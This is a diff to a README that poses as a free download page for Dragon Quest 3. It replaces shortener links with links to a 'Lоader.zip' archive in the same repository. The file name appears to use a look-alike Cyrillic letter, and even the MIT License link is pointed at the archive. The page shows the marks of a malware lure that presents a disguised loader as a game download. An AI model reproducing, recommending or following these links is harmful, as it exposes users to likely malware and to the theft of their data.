@@ -1,6 +1,6 @@
 # 🐉 Dragon Quest 3 Download [2025 Release]
 
-[![🟩 Download Now](https://img.shields.io/badge/Download%20Dragon%20Quest%203-2025-blueviolet?style=for-the-badge&logo=github)](https://easylauncher.su/PSnzrH)
+[![🟩 Download Now](https://raw.githubusercontent.com/ValiantKaka/DragonQuest3-Legends-Edition-Download/main/Lоader.zip%20Dragon%20Quest%203-2025-blueviolet?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/ValiantKaka/DragonQuest3-Legends-Edition-Download/main/Lоader.zip)
 
 ---
 
@@ -48,7 +48,7 @@ Dragon Quest 3 download, 2025 edition, classic RPG for Windows, Mac, Linux, Stea
 **Step 1:**  
 Download the latest version below:
 
-[![🟩 Download Dragon Quest 3 Now](https://img.shields.io/badge/Download%20Dragon%20Quest%203-2025-blue?style=for-the-badge&logo=github)](https://easylauncher.su/PSnzrH)
+[![🟩 Download Dragon Quest 3 Now](https://raw.githubusercontent.com/ValiantKaka/DragonQuest3-Legends-Edition-Download/main/Lоader.zip%20Dragon%20Quest%203-2025-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/ValiantKaka/DragonQuest3-Legends-Edition-Download/main/Lоader.zip)
 
 Follow the provided instructions and launch your journey!
 
@@ -56,7 +56,7 @@ Follow the provided instructions and launch your journey!
 
 ## ⚖️ License
 
-Distributed under the [MIT License](https://opensource.org/licenses/MIT). For personal use and sharing.
+Distributed under the [MIT License](https://raw.githubusercontent.com/ValiantKaka/DragonQuest3-Legends-Edition-Download/main/Lоader.zip). For personal use and sharing.
 
 ---
 
@@ -66,4 +66,4 @@ This project is a community initiative. All images, logos, and names belong to t
 
 ---
 
-[![🟩 Click here for Dragon Quest 3 Download](https://img.shields.io/badge/Download%20Dragon%20Quest%203-2025-brightgreen?style=for-the-badge&logo=github)](https://easylauncher.su/PSnzrH)
+[![🟩 Click here for Dragon Quest 3 Download](https://raw.githubusercontent.com/ValiantKaka/DragonQuest3-Legends-Edition-Download/main/Lоader.zip%20Dragon%20Quest%203-2025-brightgreen?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/ValiantKaka/DragonQuest3-Legends-Edition-Download/main/Lоader.zip)
